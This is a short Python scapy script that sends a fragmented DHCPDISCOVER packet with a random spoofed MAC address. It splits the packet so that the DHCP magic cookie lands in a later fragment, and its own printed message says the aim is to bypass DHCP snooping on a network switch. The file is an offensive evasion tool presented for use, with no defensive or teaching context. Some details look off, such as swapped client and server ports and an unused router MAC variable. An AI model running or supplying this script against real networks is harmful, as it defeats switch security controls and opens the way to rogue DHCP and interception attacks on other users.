#!/usr/bin/python3

from scapy.all import RandMAC, IP, UDP, BOOTP, DHCP, sendp, Ether, fragment
from time import sleep
import random

IFACE = "Ethernet 2"
FAKE_MAC = RandMAC()
router_mac = "c0:49:43:5a:ce:47"
XID = random.randint(1, 0xffffffff)

full_pkt = IP(src="0.0.0.0", dst="255.255.255.255") / \
           UDP(sport=67, dport=68) / \
           BOOTP(op=1, chaddr=FAKE_MAC, xid=XID) / \
           DHCP(options=[("message-type", "discover"), ('end')])

# This ensures the DHCP Magic Cookie (0x63825363) is in fragment 2, not fragment 1.
fragments = fragment(full_pkt, fragsize=100)

print(f"[*] Sending {len(fragments)} fragments to bypass DHCP Snooping...")
for frag in fragments:
    # Wrap each fragment in an Ethernet broadcast frame
    sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / frag, iface=IFACE, verbose=0)
    sleep(0.05)  # Small delay to prevent switch from dropping fragments

print("[*] Fragmented DHCPDISCOVER sent!")